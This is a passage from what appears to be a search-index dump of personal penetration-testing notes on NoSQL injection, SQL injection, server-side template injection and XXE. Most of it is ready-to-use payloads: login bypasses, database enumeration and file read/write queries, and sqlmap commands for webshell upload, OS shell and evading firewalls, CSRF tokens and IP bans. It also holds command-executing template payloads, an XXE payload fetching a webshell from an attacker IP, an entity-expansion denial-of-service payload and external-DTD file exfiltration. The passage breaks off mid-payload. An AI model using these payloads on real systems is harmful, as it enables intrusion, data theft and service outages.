INJECTION(NOSQLI)","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> </ul>"},{"location":"zNew/Web/OWASP/NOSQLI/#manual","title":"manual:","text":"<pre><code>\"change content type to application/json\"\n{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}\n</code></pre> <ul> <li><code>admin' || '' === '</code> Bypass login page with admin as user`</li> <li><code>';return 'a'=='a' &amp;&amp; ''==' -</code> Extract all data</li> </ul>"},{"location":"zNew/Web/OWASP/SQLi/","title":"SQLi","text":""},{"location":"zNew/Web/OWASP/SQLi/#delete","title":"delete","text":""},{"location":"zNew/Web/OWASP/SQLi/#sql-injectionsqli","title":"SQL INJECTION(SQLi)","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> <li>NetSPI</li> <li>https://tib3rius.com/sqli</li> <li>portswigger</li> <li>https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/</li> </ul> <p>dbfiddle.uk</p> <p>We want to find credentials exploring possible DBs and tables. Another way is to read files.</p>"},{"location":"zNew/Web/OWASP/SQLi/#manual","title":"manual:","text":"<p>admin' or 1=1 LIMIT 1-- -</p> <ul> <li><code>admin' union select 1;-- -</code></li> <li>FIND ALL DBS:   <code>admin' UNION SELECT group_concat(schema_name) FROM information_schema.schemata;-- -</code></li> <li>FIND TABLES IN DB:   <code>admin' UNION SELECT group_concat(table_name) FROM information_schema.tables where table_schema='november';-- -</code></li> <li>FIND COLUMNS IN TABLE:   <code>admin' UNION SELECT group_concat(table_name, ':', column_name) FROM INFORMATION_SCHEMA.columns WHERE table_schema='november';-- -</code></li> <li>FIND VALUES:   <code>admin' UNION SELECT group_concat(one) FROM flag;-- -</code></li> <li>READ FILES:   <code>admin' UNION SELECT load_file('/var/www/html/index.php');-- -</code></li> </ul>"},{"location":"zNew/Web/OWASP/SQLi/#manual-time-based","title":"manual time based:","text":"<ul> <li>FIND DB NUMBER OF CHARACTERS:</li> <li><code>1%20OR%20IF(LENGTH((SELECT%20database()))=5,SLEEP(1),0)%23</code></li> </ul>"},{"location":"zNew/Web/OWASP/SQLi/#sql-truncation","title":"SQL Truncation","text":"<p>SQL truncation is a flaw in the database configuration in which an input is truncated (deleted) when added to the database due to surpassing the maximum defined length. The database management system truncates any newly inserted values to fit the width of the designated column size.</p> <p>So, where can we find this vulnerability ?? it can be found in any web application that allows users to sign up/register for new accounts.</p> <p>If the database considers spaces as valid characters between inputs and doesn\u2019t do any trimming before storing the values, an attacker can create a duplicate accounts of an existing user like \u2018\u2019admin\u2019\u2019 with many additional spaces and characters \u2014 \u2018\u2019admin++++++random\u2019\u2019 that are too long to be stored in the specified column and gets deleted after passing the max length.</p> <p>So, instead of storing \u201cadmin++++++random\u2019\u2019 as an entry, the database will truncate the second half to fit it in the column (\u2018\u2019admin +++++\u2019\u2019).</p> <p>Next time an attacker logs in to the application with the admin account, the database will search for all matching accounts and will consider them valid for logging in. Therefore any entry with username as admin with space or without is a valid entry that can be used to authenticate to the application.</p> <p>\u201cadmin\u201d == \u2018admin +++++\u2019</p>"},{"location":"zNew/Web/OWASP/SQLi/#identifying-sqli","title":"Identifying SQLi","text":"<pre><code>'\n\"\n#\n;\n)\n' '\n'||'\n'+'\n' AND '1'='1\n' OR '1'='1\n' -- -\n' OR '1'='1;-- -\n[space]-- -\n[space]AND 1=1\n[space]AND 1=1 -- -\n</code></pre>"},{"location":"zNew/Web/OWASP/SQLi/#identifying-variants","title":"Identifying Variants","text":"Order Payload DBMS 1 AND 'foo' 'bar' = 'foobar' MySQL 2 AND DATALENGTH('foo') = 3 MSSQL 3 AND TO_HEX(1) = '1' PostgreSQL 4 AND LENGTHB('foo') = '3' Oracle 5 AND GLOB('foo*', 'foobar') = 1 SQLite"},{"location":"zNew/Web/OWASP/SQLi/#list-databases","title":"List Databases","text":"DBMS Payload MySQL SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA  SELECT db FROM mysql.db MSSQL SELECT name FROM master.sys.databases  SELECT name FROM master..sysdatabases PostgreSQL SELECT datname FROM pg_database  SELECT DISTINCT(schemaname) FROM pg_tables Oracle SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES) SQLite N/A"},{"location":"zNew/Web/OWASP/SQLi/#list-tables","title":"List Tables","text":"DBMS Payload MySQL SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='[DBNAME]'  SELECT database_name,table_name FROM mysql.innodb_table_stats WHERE database_name='[DBNAME]' MSSQL SELECT table_name FROM information_schema.tables WHERE table_catalog='[DBNAME]'  SELECT name FROM [DBNAME]..sysobjects WHERE xtype='U' PostgreSQL SELECT tablename FROM pg_tables WHERE schemaname = '[SCHEMA_NAME]'  SELECT table_name FROM information_schema.tables WHERE table_schema='[SCHEMA_NAME]' Oracle SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='[DBNAME]' SQLite SELECT tbl_name FROM sqlite_master WHERE type='table'"},{"location":"zNew/Web/OWASP/SQLi/#list-columns","title":"List Columns","text":"DBMS Payload MySQL SELECT column_name,column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='[TABLE_NAME]' AND table_schema='[DBNAME]' MSSQL SELECT COL_NAME(OBJECT_ID('[DBNAME].[TABLE_NAME]'), [INDEX]) PostgreSQL SELECT column_name,data_type FROM information_schema.columns WHERE table_schema='[DBNAME]' AND table_name='[TABLE_NAME]' Oracle SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='[TABLE_NAME]' AND OWNER='[DBNAME]' SQLite SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='[TABLE_NAME]'  SELECT name FROM PRAGMA_TABLE_INFO('[TABLE_NAME]')"},{"location":"zNew/Web/OWASP/SQLi/#dump-data","title":"Dump Data","text":"DBMS Payload MySQL SELECT [COLUMN_NAME] FROM [DBNAME].[TABLE_NAME] MSSQL PostgreSQL Oracle SQLite N/A"},{"location":"zNew/Web/OWASP/SQLi/#db-user","title":"DB User","text":"<p>Determine which user we are within the database.</p> DBMS Payload MySQL SELECT USER()  SELECT CURRENT_USER()  SELECT user from mysql.user MSSQL PostgreSQL Oracle SQLite"},{"location":"zNew/Web/OWASP/SQLi/#user-privileges","title":"User Privileges","text":"<p>Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:</p>"},{"location":"zNew/Web/OWASP/SQLi/#super-admin-privileges","title":"Super admin privileges","text":"<p>The query returns Y, which means YES, indicating superuser privileges. </p> DBMS Payload MySQL SELECT super_priv FROM mysql.user WHERE user='[DB_USER]' MSSQL PostgreSQL Oracle SQLite"},{"location":"zNew/Web/OWASP/SQLi/#other-privileges","title":"Other Privileges","text":"<p>We can also dump other privileges we have directly from the schema, with the following query:</p> DBMS Payload MySQL SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee=\"'[DB_USER]@localhost'\" MSSQL PostgreSQL Oracle SQLite"},{"location":"zNew/Web/OWASP/SQLi/#files","title":"Files","text":"<p>First, we have to determine which user we are within the database. While we do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMSes, as only DBA are given such privileges. The same applies to other common databases. If we do have DBA privileges, then it is much more probable that we have file-read privileges. If we do not, then we have to check our privileges to see what we can do.</p>"},{"location":"zNew/Web/OWASP/SQLi/#read","title":"Read","text":"DBMS Payload MySQL LOAD_FILE('/path/to/file') MSSQL OPENROWSET(BULK 'C:\\path\\to\\file', SINGLE_CLOB) PostgreSQL PG_READ_FILE('/path/to/file') Oracle utl_file.get_line(utl_file.fopen('/path/to/','file','R'), ) SQLite readfile('/path/to/file') <p>To be able to write files to the back-end server using a MySQL database, we require three things:</p> <ul> <li>User with FILE privilege enabled</li> <li>MySQL global secure_file_priv variable not enabled</li> <li>Write access to the location we want to write to on the back-end server</li> </ul>"},{"location":"zNew/Web/OWASP/SQLi/#write","title":"Write","text":"<p><code>Note: To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use load_file to read the server configuration, like Apache's configuration found at /etc/apache2/apache2.conf, Nginx's configuration at /etc/nginx/nginx.conf, or IIS configuration at %WinDir%\\System32\\Inetsrv\\Config\\ApplicationHost.config, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using</code> this wordlist for Linux<code>or</code>this wordlist for Windows<code>. Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.</code></p> DBMS Payload MySQL SELECT 'contents' INTO OUTFILE '/path/to/file' MSSQL execute spWriteStringToFile 'contents', 'C:\\path\\to\\', 'file' PostgreSQL COPY (SELECT 'contents') TO '/path/to/file' Oracle utl_file.put_line(utl_file.fopen('/path/to/','file','R'), ) SQLite SELECT writefile('/path/to/file', column_name) FROM table_name"},{"location":"zNew/Web/OWASP/SQLi/#mysql","title":"MySQL","text":"<p>There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them. We will then filter the results to only show the secure_file_priv variable. If secure_file_priv value is empty, meaning that we can read/write files to any location.</p> <pre><code>SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name=\"secure_file_priv\"\n</code></pre>"},{"location":"zNew/Web/OWASP/SQLi/#in-band","title":"In-Band","text":"<p>In simple cases, the output of both the intended and the new query may be printed directly on the front end, and we can directly read it. This is known as In-band SQL injection, and it has two types: Union Based and Error Based.</p>"},{"location":"zNew/Web/OWASP/SQLi/#union-based","title":"Union Based","text":"<p>With Union Based SQL injection, we may have to specify the exact location, 'i.e., column', which we can read, so the query will direct the output to be printed there. </p>"},{"location":"zNew/Web/OWASP/SQLi/#detect-number-of-columns","title":"Detect number of columns","text":"<p>A UNION statement can only operate on SELECT statements with an equal number of columns. </p> <p>When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error.  For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.</p>"},{"location":"zNew/Web/OWASP/SQLi/#mysql_1","title":"MySQL","text":""},{"location":"zNew/Web/OWASP/SQLi/#using-order-by","title":"Using Order By","text":"<p>The first way of detecting the number of columns is through the ORDER BY function, which we discussed earlier. We have to inject a query that sorts the results by a column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.</p> <p>For example, we can start with order by 1, sort by the first column, and succeed, as the table must have at least one column. Then we will do order by 2 and then order by 3 until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist. The final successful column we successfully sorted by gives us the total number of columns.</p> <p>If we failed at order by 4, this means the table has three columns, which is the number of columns we were able to sort by successfully. Let us go back to our previous example and attempt the same, with the following payload:</p> <pre><code>cn' order by 1;-- -\n</code></pre>"},{"location":"zNew/Web/OWASP/SQLi/#using-union","title":"Using UNION","text":"<p>The other method is to attempt a Union injection with a different number of columns until we successfully get the results back. The first method always returns the results until we hit an error, while this method always gives an error until we get a success. </p> <pre><code>cn' UNION select 1,2,3;-- -\n</code></pre>"},{"location":"zNew/Web/OWASP/SQLi/#error-based","title":"Error Based","text":"<p>As for Error Based SQL injection, it is used when we can get the PHP or SQL errors in the front-end, and so we may intentionally cause an SQL error that returns the output of our query.</p>"},{"location":"zNew/Web/OWASP/SQLi/#blind","title":"Blind","text":"<p>In more complicated cases, we may not get the output printed, so we may utilize SQL logic to retrieve the output character by character. This is known as Blind SQL injection, and it also has two types: Boolean Based and Time Based.</p>"},{"location":"zNew/Web/OWASP/SQLi/#boolean-based","title":"Boolean Based","text":"<p>With Boolean Based SQL injection, we can use SQL conditional statements to control whether the page returns any output at all, 'i.e., original query response,' if our conditional statement returns true.</p>"},{"location":"zNew/Web/OWASP/SQLi/#timed-based","title":"Timed Based","text":"<p>As for Time Based SQL injections, we use SQL conditional statements that delay the page response if the conditional statement returns true using the Sleep() function.</p>"},{"location":"zNew/Web/OWASP/SQLi/#out-of-band","title":"Out Of Band","text":"<p>In some cases, we may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there. This is known as Out-of-band SQL injection.</p>"},{"location":"zNew/Web/OWASP/SQLi/#sqlmap","title":"SQLMap:","text":"<pre><code>sqlmap -r request.req --dbs\nsqlmap -r request.req -D main --tables\nsqlmap -r request.req -D main -T user --columns\nsqlmap -r request.req -D main -T user --dump\nsqlmap -r req.req --level=5 --risk=3 --batch --file-read=/var/www/html/index.php&gt;\nsqlmap -r req.req --level=5 --risk=3 --batch --file-write=/home/kali/Downloads/Exploit/webshell.php --file-dest=/var/www/html/webshell.php\nsqlmap -u \"ws://soc-player.soccer.htb:9091\" --data '{\"id\": \"*\"}' --threads 10 --level 5 --risk 3 --batch -D soccer_db -T accounts --dump\n</code></pre> <ul> <li><code>-r</code> Request file</li> <li><code>--level</code> (max 5)</li> <li><code>--risk</code> (max 3)</li> <li><code>--batch</code> Ask no questions</li> <li><code>--no-cast</code> Assure the correct content</li> <li><code>--fresh-queries</code> Run the query again</li> <li><code>--prefix</code> Add a prefix before every payload</li> <li><code>--suffix</code> Add a suffix after every payload</li> </ul> <p>Data Enumeration   - <code>--banner</code> Database version banner   - <code>--current-user</code> Current user name   - <code>--current-db</code> Current database name    - <code>--is-dba</code> Checking if the current user has administrator rights.</p> <p>Data Exfiltration   - <code>--dbs</code> Enumerate databases   - <code>--tables</code> Enumerate DB tables   - <code>--columns</code> Enumerate columns   - <code>--dump</code> Get table values if table is given, if not all of the current database content will be retrieved   - <code>-D</code> Select DB   - <code>-T</code> Select Table   - <code>-C</code> Select Columns   - <code>--dump-all --exclude-sysdbs</code> All the content from all the databases will be retrieve except the content from system databases   - <code>--where=\"name LIKE 'f%'\"</code> Conditional Enumeration</p> <p>Advanced Data Exfiltration   - <code>--schema</code> Retrieve the structure of all of the tables   - <code>--search -T user</code> Search for databases, tables, and columns   - <code>--passwords</code> Dump the content of system tables containing database-specific credentials</p> <p>OS Exploitation   - <code>--file-read</code> Path to file that we want to read from server   - <code>--file-write</code> Path to file that we want to upload to server   - <code>--file-dest</code> Path to location that we want to put the uploaded file   - <code>--os-shell</code> Directly execute OS command</p>"},{"location":"zNew/Web/OWASP/SQLi/#request","title":"Request","text":""},{"location":"zNew/Web/OWASP/SQLi/#curl-commands","title":"Curl Commands","text":"<p>One of the best and easiest ways to properly set up an SQLMap request against the specific target (i.e., web request with parameters inside) is by utilizing Copy as cURL feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools. </p>"},{"location":"zNew/Web/OWASP/SQLi/#getpost-requests","title":"GET/POST Requests","text":"<p>In the most common scenario, GET parameters are provided with the usage of option -u/--url, as in the previous example. As for testing POST data, the --data flag can be used.</p> <p>In such cases, POST parameters uid and name will be tested for SQLi vulnerability. For example, if we have a clear indication that the parameter uid is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter using -p uid. Otherwise, we could mark it inside the provided data with the usage of special marker *.</p>"},{"location":"zNew/Web/OWASP/SQLi/#bypassing-web-application-protections","title":"Bypassing Web Application Protections","text":""},{"location":"zNew/Web/OWASP/SQLi/#anti-csrf-token-bypass","title":"Anti-CSRF Token Bypass","text":"<p>One of the first lines of defense against the usage of automation tools is the incorporation of anti-CSRF (i.e., Cross-Site Request Forgery) tokens into all HTTP requests, especially those generated as a result of web-form filling.</p> <p>In most basic terms, each HTTP request in such a scenario should have a (valid) token value available only if the user actually visited and used the page. While the original idea was the prevention of scenarios with malicious links, where just opening these links would have undesired consequences for unaware logged-in users (e.g., open administrator pages and add a new user with predefined credentials), this security feature also inadvertently hardened the applications against the (unwanted) automation.</p> <p>Nevertheless, SQLMap has options that can help in bypassing anti-CSRF protection. Namely, the most important option is --csrf-token. By specifying the token parameter name (which should already be available within the provided request data), SQLMap will automatically attempt to parse the target response content and search for fresh token values so it can use them in the next request.</p> <p>Additionally, even in a case where the user does not explicitly specify the token's name via --csrf-token, if one of the provided parameters contains any of the common infixes (i.e. csrf, xsrf, token), the user will be prompted whether to update it in further requests.</p> <pre><code>$ sqlmap -u \"http://www.example.com/\" --data=\"id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE\" --csrf-token=\"csrf-token\"\n</code></pre>"},{"location":"zNew/Web/OWASP/SQLi/#unique-value-bypass","title":"Unique Value Bypass","text":"<p>In some cases, the web application may only require unique values to be provided inside predefined parameters. Such a mechanism is similar to the anti-CSRF technique described above, except that there is no need to parse the web page content. So, by simply ensuring that each request has a unique value for a predefined parameter, the web application can easily prevent CSRF attempts while at the same time averting some of the automation tools. For this, the option --randomize should be used, pointing to the parameter name containing a value which should be randomized before being sent.</p> <pre><code>$ sqlmap -u \"http://www.example.com/?id=1&amp;rp=29125\" --randomize=rp --batch -v 5\n</code></pre>"},{"location":"zNew/Web/OWASP/SQLi/#calculated-parameter-bypass","title":"Calculated Parameter Bypass","text":"<p>Another similar mechanism is where a web application expects a proper parameter value to be calculated based on some other parameter value(s). Most often, one parameter value has to contain the message digest (e.g. h=MD5(id)) of another one. To bypass this, the option --eval should be used, where a valid Python code is being evaluated just before the request is being sent to the target.</p> <pre><code>$ sqlmap -u \"http://www.example.com/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b\" --eval=\"import hashlib; h=hashlib.md5(id).hexdigest()\" --batch -v 5 \n</code></pre>"},{"location":"zNew/Web/OWASP/SQLi/#ip-address-concealing","title":"IP Address Concealing","text":"<p>In case we want to conceal our IP address, or if a certain web application has a protection mechanism that blacklists our current IP address, we can try to use a proxy or the anonymity network Tor. A proxy can be set with the option --proxy (e.g. --proxy=\"socks4://177.39.187.70:33283\"), where we should add a working proxy.</p> <p>In addition to that, if we have a list of proxies, we can provide them to SQLMap with the option --proxy-file. This way, SQLMap will go sequentially through the list, and in case of any problems (e.g., blacklisting of IP address), it will just skip from current to the next from the list. The other option is Tor network use to provide an easy to use anonymization, where our IP can appear anywhere from a large list of Tor exit nodes. When properly installed on the local machine, there should be a SOCKS4 proxy service at the local port 9050 or 9150. By using switch --tor, SQLMap will automatically try to find the local port and use it appropriately.</p> <p>If we wanted to be sure that Tor is properly being used, to prevent unwanted behavior, we could use the switch --check-tor. In such cases, SQLMap will connect to the https://check.torproject.org/ and check the response for the intended result (i.e., Congratulations appears inside).</p>"},{"location":"zNew/Web/OWASP/SQLi/#waf-bypass","title":"WAF Bypass","text":"<p>Whenever we run SQLMap, As part of the initial tests, SQLMap sends a predefined malicious looking payload using a non-existent parameter name (e.g. ?pfov=...) to test for the existence of a WAF (Web Application Firewall). There will be a substantial change in the response compared to the original in case of any protection between the user and the target. For example, if one of the most popular WAF solutions (ModSecurity) is implemented, there should be a 406 - Not Acceptable response after such a request.</p> <p>In case of a positive detection, to identify the actual protection mechanism, SQLMap uses a third-party library identYwaf, containing the signatures of 80 different WAF solutions. If we wanted to skip this heuristical test altogether (i.e., to produce less noise), we can use switch --skip-waf.</p>"},{"location":"zNew/Web/OWASP/SQLi/#user-agent-blacklisting-bypass","title":"User-agent Blacklisting Bypass","text":"<p>In case of immediate problems (e.g., HTTP error code 5XX from the start) while running SQLMap, one of the first things we should think of is the potential blacklisting of the default user-agent used by SQLMap (e.g. User-agent: sqlmap/1.4.9 (http://sqlmap.org)).</p> <p>This is trivial to bypass with the switch --random-agent, which changes the default user-agent with a randomly chosen value from a large pool of values used by browsers.</p>"},{"location":"zNew/Web/OWASP/SQLi/#tamper-scripts","title":"Tamper Scripts","text":"<p>Finally, one of the most popular mechanisms implemented in SQLMap for bypassing WAF/IPS solutions is the so-called \"tamper\" scripts. Tamper scripts are a special kind of (Python) scripts written for modifying requests just before being sent to the target, in most cases to bypass some protection.</p> <p>For example, one of the most popular tamper scripts between is replacing all occurrences of greater than operator (&gt;) with NOT BETWEEN 0 AND #, and the equals operator (=) with BETWEEN # AND #. This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed, at least for SQLi purposes.</p> <p>Tamper scripts can be chained, one after another, within the --tamper option (e.g. --tamper=between,randomcase), where they are run based on their predefined priority. A priority is predefined to prevent any unwanted behavior, as some scripts modify payloads by modifying their SQL syntax (e.g. ifnull2ifisnull). In contrast, some tamper scripts do not care about the inner content (e.g. appendnullbyte).</p> <p>Tamper scripts can modify any part of the request, although the majority change the payload content. The most notable tamper scripts are the following:</p> Tamper-Script Description 0eunion Replaces instances of UNION with e0UNION base64encode Base64-encodes all characters in a given payload between Replaces greater than operator (&gt;) with NOT BETWEEN 0 AND # and equals operator (=) with BETWEEN # AND # commalesslimit Replaces (MySQL) instances like LIMIT M, N with LIMIT N OFFSET M counterpart equaltolike Replaces all occurrences of operator equal (=) with LIKE counterpart halfversionedmorekeywords Adds (MySQL) versioned comment before each keyword modsecurityversioned Embraces complete query with (MySQL) versioned comment modsecurityzeroversioned Embraces complete query with (MySQL) zero-versioned comment percentage Adds a percentage sign (%) in front of each character (e.g. SELECT -&gt; %S%E%L%E%C%T) plus2concat Replaces plus operator (+) with (MsSQL) function CONCAT() counterpart randomcase Replaces each keyword character with random case value (e.g. SELECT -&gt; SEleCt) space2comment Replaces space character ( ) with comments `/ space2dash Replaces space character ( ) with a dash comment (--) followed by a random string and a new line (\\n) space2hash Replaces (MySQL) instances of space character ( ) with a pound character (#) followed by a random string and a new line (\\n) space2mssqlblank Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters space2plus Replaces space character ( ) with plus (+) space2randomblank Replaces space character ( ) with a random blank character from a valid set of alternate characters symboliclogical Replaces AND and OR logical operators with their symbolic counterparts (&amp;&amp; and versionedkeywords Encloses each non-function keyword with (MySQL) versioned comment versionedmorekeywords Encloses each keyword with (MySQL) versioned comment <p>To get a whole list of implemented tamper scripts, along with the description as above, switch --list-tampers can be used. We can also develop custom Tamper scripts for any custom type of attack, like a second-order SQLi.</p>"},{"location":"zNew/Web/OWASP/SQLi/#miscellaneous-bypasses","title":"Miscellaneous Bypasses","text":"<p>Out of other protection bypass mechanisms, there are also two more that should be mentioned. The first one is the Chunked transfer encoding, turned on using the switch --chunked, which splits the POST request's body into so-called \"chunks.\" Blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.</p> <p>The other bypass mechanisms is the HTTP parameter pollution (HPP), where payloads are split in a similar way as in case of --chunked between different same parameter named values (e.g. ?id=1&amp;id=UNION&amp;id=SELECT&amp;id=username,password&amp;id=FROM&amp;id=users...), which are concatenated by the target platform if supporting it (e.g. ASP).</p>"},{"location":"zNew/Web/OWASP/SSTI/","title":"Server Side Template Injection(SSTI)","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> <li>PayLoads 2</li> <li>YouTube</li> </ul>"},{"location":"zNew/Web/OWASP/SSTI/#payloads","title":"Payloads:","text":"<ul> <li><code>${{&lt;%[%'\"}}%\\.</code></li> <li><code>{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}</code></li> <li><code>{{range.constructor(\\\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\\\")()}}</code> nodeJS</li> </ul>"},{"location":"zNew/Web/OWASP/XEE/","title":"XML External Entity(XEE)","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> </ul> <p>XML External Entity (XXE) Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions. XXE vulnerabilities can cause considerable damage to a web application and its back-end server, from disclosing sensitive files to shutting the back-end server down, which is why it is considered one of the Top 10 Web Security Risks by OWASP.</p> <p><code>Note: We may also use the PUBLIC keyword instead of SYSTEM for loading external resources, which is used with publicly declared entities and standards, such as a language code (lang=\"en\").</code></p>"},{"location":"zNew/Web/OWASP/XEE/#identifying","title":"Identifying","text":"<p>The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input.</p>"},{"location":"zNew/Web/OWASP/XEE/#reading-sensitive-files","title":"Reading Sensitive Files","text":"<pre><code>&lt;!DOCTYPE email [\n  &lt;!ENTITY company SYSTEM \"file:///etc/passwd\"&gt;\n]&gt;\n\n&lt;tag displayed &gt;\n  &amp;company;\n&lt;/tag displayed &gt;\n</code></pre>"},{"location":"zNew/Web/OWASP/XEE/#reading-source-code","title":"Reading Source Code","text":"<pre><code>&lt;!DOCTYPE email [\n  &lt;!ENTITY company SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"&gt;\n]&gt;\n</code></pre> <p>We can select the base64 string, click on Burp's Inspector tab (on the right pane), and it will show us the decoded file. For more on PHP filters, you can refer to the File Inclusion / Directory Traversal module.</p>"},{"location":"zNew/Web/OWASP/XEE/#remote-code-execution-with-xxe","title":"Remote Code Execution with XXE","text":"<p>In addition to reading local files, we may be able to gain code execution over the remote server. The easiest method would be to look for ssh keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making a call to our server. If these do not work, we may still be able to execute commands on PHP-based web applications through the PHP://expect filter, though this requires the PHP expect module to be installed and enabled.</p> <p>The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server, as follows:</p> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE email [\n  &lt;!ENTITY company SYSTEM \"expect://curl$IFS-O$IFS'OUR_IP/webshell.php'\"&gt;\n]&gt;\n\n&lt;tag displayed &gt;\n  &amp;company;\n&lt;/tag displayed &gt;\n</code></pre> <p><code>Note: The expect module is not enabled/installed by default on modern PHP servers, so this attack may not always work. This is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.</code></p>"},{"location":"zNew/Web/OWASP/XEE/#other-xxe-attacks","title":"Other XXE Attacks","text":"<p>Finally, one common use of XXE attacks is causing a Denial of Service (DOS) to the hosting web server, with the use the following payload:</p> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE email [\n  &lt;!ENTITY a0 \"DOS\" &gt;\n  &lt;!ENTITY a1 \"&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;\"&gt;\n  &lt;!ENTITY a2 \"&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;\"&gt;\n  &lt;!ENTITY a3 \"&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;\"&gt;\n  &lt;!ENTITY a4 \"&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;\"&gt;\n  &lt;!ENTITY a5 \"&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;\"&gt;\n  &lt;!ENTITY a6 \"&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;\"&gt;\n  &lt;!ENTITY a7 \"&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;\"&gt;\n  &lt;!ENTITY a8 \"&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;\"&gt;\n  &lt;!ENTITY a9 \"&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;\"&gt;        \n  &lt;!ENTITY a10 \"&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;\"&gt;        \n]&gt;\n&lt;root&gt;\n&lt;name&gt;&lt;/name&gt;\n&lt;tel&gt;&lt;/tel&gt;\n&lt;email&gt;&amp;a10;&lt;/email&gt;\n&lt;message&gt;&lt;/message&gt;\n&lt;/root&gt;\n</code></pre>"},{"location":"zNew/Web/OWASP/XEE/#advanced-exfiltration-with-cdata","title":"Advanced Exfiltration with CDATA","text":"<pre><code>$ echo '&lt;!ENTITY joined \"%begin;%file;%end;\"&gt;' &gt; xxe.dtd\n$ python3 -m http.server 8000\n</code></pre> <pre><code>&lt;!DOCTYPE email [\n  &lt;!ENTITY % begin \"&lt;![CDATA[\"&gt; &lt;!-- prepend the beginning of the CDATA tag --&gt;\n  &lt;!ENTITY % file SYSTEM \"file:///var/www/html/submitDetails.php\"&gt; &lt;!-- reference external file --&gt;\n  &lt;!ENTITY % end \"]]&gt;\"&gt; &lt;!-- append the end of the CDATA tag --&gt;\n  &lt;!ENTITY % xxe SYSTEM \"http://OUR_IP:8000/xxe.dtd\"&gt; &lt;!-- reference our external DTD --&gt;\n  %xxe;\n]&gt;\n...\n&lt;email&gt;&amp;joined;&lt;/email&gt; &lt;!-- reference the &amp;joined; entity to print the file content --&gt;\n</code></pre>"},{"location":"zNew/Web/OWASP/XEE/#error-based-xxe","title":"Error Based XXE","text":"<p>Another situation we may find ourselves in is one where the web application might not write any output, so we cannot control any of the XML input entities to write its content. In such cases, we would be blind to the XML output and so would not be able to retrieve the file content using our usual methods.</p> <p>First, let's try to send malformed XML data, and see if the web application displays any errors. To do so, we can delete any of the closing tags, change one of them, so it does not close (e.g.  instead of ), or just reference a non-existing entity, as follows: <p>If the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit. If the web application neither writes XML output nor displays any errors, we would face a completely blind situation, which we will discuss in the next section.</p> <p>First, we will host a DTD file that contains the following payload:</p> <pre><code>&lt;!ENTITY % file SYSTEM \"file:///etc/hosts\"&gt;\n&lt;!ENTITY % error \"&lt;!ENTITY content SYSTEM 